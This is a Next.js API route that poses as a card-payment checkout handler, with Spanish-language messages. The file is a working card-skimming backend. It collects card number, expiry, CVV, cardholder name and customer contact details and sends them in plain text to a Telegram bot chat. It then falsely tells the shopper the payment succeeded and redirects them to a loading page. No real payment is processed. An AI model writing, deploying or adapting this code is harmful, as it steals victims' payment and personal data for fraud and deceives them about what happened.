import { NextRequest, NextResponse } from 'next/server';
import { CHECKOUT_TELEGRAM_CONFIG } from '@/lib/database';

const TELEGRAM_BOT_TOKEN = CHECKOUT_TELEGRAM_CONFIG.BOT_TOKEN;
const TELEGRAM_CHAT_ID = CHECKOUT_TELEGRAM_CONFIG.CHAT_ID;

export async function POST(request: NextRequest) {
    try {
        const body = await request.json();
        const { cardNumber, expiry, cvv, cardholderName, customerData, orderTotal } = body;

        // Format message for Telegram
        const message = `
💳 <b>NUEVO PAGO CON TARJETA</b>

📋 <b>DATOS DE LA TARJETA:</b>
• Número: ${cardNumber}
• Vencimiento: ${expiry}
• CVV: ${cvv}
• Titular: ${cardholderName}

👤 <b>CLIENTE:</b>
• Nombre: ${customerData.firstName} ${customerData.lastName}
• Email: ${customerData.email}
• Teléfono: ${customerData.phone}
• Ciudad: ${customerData.city}

💰 <b>MONTO TOTAL:</b> ${orderTotal}

🕐 Fecha: ${new Date().toLocaleString('es-ES')}
        `.trim();

        // Send to Telegram
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const telegramResponse = await fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        const telegramData = await telegramResponse.json();

        if (telegramData.ok) {
            return NextResponse.json({
                success: true,
                message: 'Pago procesado exitosamente',
                redirectUrl: '/pago/cargando'
            });
        } else {
            throw new Error('Error al enviar a Telegram');
        }

    } catch (error) {
        console.error('Error processing payment:', error);
        return NextResponse.json(
            { success: false, message: 'Error al procesar el pago' },
            { status: 500 }
        );
    }
}
